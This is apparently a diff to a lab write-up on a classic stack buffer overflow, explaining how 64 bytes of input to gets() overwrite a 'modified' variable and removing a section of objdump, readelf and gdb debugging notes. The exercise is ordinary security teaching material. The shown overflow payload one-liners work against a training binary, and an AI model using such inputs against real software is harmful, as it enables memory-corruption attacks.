@@ -29,16 +29,3 @@ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"B" + b"\n")' | ./bin
 
 ## Why it works
 `gets` does not check input length. The first 64 bytes fill the buffer, and the 65th byte (or later) overwrites `modified` with a nonzero value.
-
-## Extra notes
-- Inspect assembly: `objdump -d -M intel bin`
-- Inspect symbols: `readelf -s bin`
-- Debug offset:
-```bash
-gdb -q ./bin <<'EOF'
-b *0x08048411
-run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*80 + b"\n")')
-x/4xw $esp+0x5c
-EOF
-```
-- `modified` only needs to be nonzero; any byte after the 64-byte buffer is enough.
